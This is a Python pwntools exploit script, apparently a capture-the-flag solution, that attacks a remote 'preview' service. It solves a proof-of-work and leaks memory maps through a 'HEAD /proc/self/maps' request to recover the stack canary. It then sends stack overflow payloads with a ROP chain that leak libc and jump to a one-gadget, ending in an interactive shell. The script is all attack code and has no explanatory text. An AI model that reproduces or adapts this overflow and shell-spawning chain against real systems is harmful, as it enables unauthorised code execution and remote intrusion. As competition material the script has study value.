from pwn import *

#s = process('./preview')

s = remote('cee810fa.quals2018.oooverflow.io',31337)

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1
def pow():
	s.recvuntil('Challenge:')
	so = s.recv(11)[1:]
	print "Challenge:",so
	n = s.recvuntil('S')[4:6]
	print "n :",n
	solution = solve_pow(so,int(n))
	pow_ = pow_hash(so,solution)
	s.sendline(str(solution))

pow()

s.recvuntil('Standing by for your requests')
s.sendline('HEAD /proc/self/maps')
s.recvuntil('Here\'s your preview:')
s.recv(1)
t = s.recvuntil('\n')
if 'ld-2.23.so' in t:
	p = t[:10]
	high = int(p,16)
else:
	p = t[:10]
	low = int(p,16)
s.recvuntil('\n')
s.recvuntil('\n')
t = s.recvuntil('\n')
if 'ld-2.23.so' in t:
        p = t[:10]
        high = int(p,16)
else:
        p = t[:10]
        low = int(p,16)
canary = high<<24|low>>4
print 'canary :',hex(canary)
text = low
pay = 'A'*0x58+p64(canary)+p64(0xdeadbeef)+p64(low+0x10AA)
pay+= p64(0)+p64(1)+p64(low+0x202028)+p64(8)+p64(low+0x202028)+p64(1)
pay+= p64(low+0x1090)

pay+= p64(0xdeadbeef)+p64(0)*6+p64(low+0xECB)+p64(0)*3
print len(pay)
#sleep(10)
s.send(pay)
s.recvuntil('request\n')
libc = u64(s.recv(8))-0xF72B0
print 'libc :',hex(libc)
#s.send(p64(libc+0x4526a))
#sleep(10)
pay2 = 'A'*0x57+p64(canary)+p64(0xdeadbeef)+p64(libc+0x4526a)+p64(0)*10
s.sendline(pay2)
s.interactive()
